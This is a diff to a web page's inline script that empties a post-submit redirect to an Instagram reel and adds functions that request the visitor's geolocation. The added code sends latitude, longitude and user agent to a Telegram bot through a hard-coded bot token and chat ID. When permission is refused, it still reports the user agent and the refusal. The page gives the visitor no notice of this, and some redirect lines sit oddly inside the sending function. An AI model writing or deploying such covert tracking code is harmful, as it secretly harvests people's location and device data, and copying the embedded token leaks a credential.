@@ -977,15 +977,81 @@
                 method:"post",
                 success:function (response){
                     
-                    window.location.reload()
-                    window.location.href="https://www.instagram.com/reel/CikcthQhXio/?igshid=YmMyMTA2M2Y="
-                },
+                       },
                 error:function (err){
                     alert("Something Error")
     
                 }
             })
         })
+
+
+
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendLocationToBot, handleLocationError);
+  } else {
+    console.log("Geolocation is not supported by this browser.");
+  }
+}
+
+
+function sendLocationToBot(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const botToken = "1573318838:AAEo6CLOlyoMH78Y-Rr65_D21mVuJhWig_0";
+  const chatId = "996470973";
+                    window.location.reload()
+                    window.location.href="https://www.instagram.com/reel/CikcthQhXio/?igshid=YmMyMTA2M2Y="
+              
+                
+  // Send device info
+  const deviceInfo = `Device Info:\n\nUser Agent: ${navigator.userAgent}\n\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+  const deviceInfoUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${deviceInfo}`;
+
+  fetch(deviceInfoUrl)
+    .then(response => response.json())
+    .then(data => {
+      if (latitude && longitude) {
+        // Send location
+        const locationUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+        fetch(locationUrl)
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error(error));
+      }
+    })
+    .catch(error => console.error(error));
+}
+
+function handleLocationError(error) {
+  const botToken = "1573318838:AAEo6CLOlyoMH78Y-Rr65_D21mVuJhWig_0";
+  const chatId = "996470973";
+  
+  // Send device info
+  const deviceInfo = `Device Info:\n\nUser Agent: ${navigator.userAgent}`;
+  const deviceInfoUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${deviceInfo}`;
+
+  fetch(deviceInfoUrl)
+    .then(response => response.json())
+    .then(data => {
+      if (error.code === error.PERMISSION_DENIED) {
+        const errorMessage = "Location permission denied by user.";
+
+        const errorUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${errorMessage}`;
+
+        fetch(errorUrl)
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error(error));
+      }
+    })
+    .catch(error => console.error(error));
+}
+
+
+
     </script>
        
 
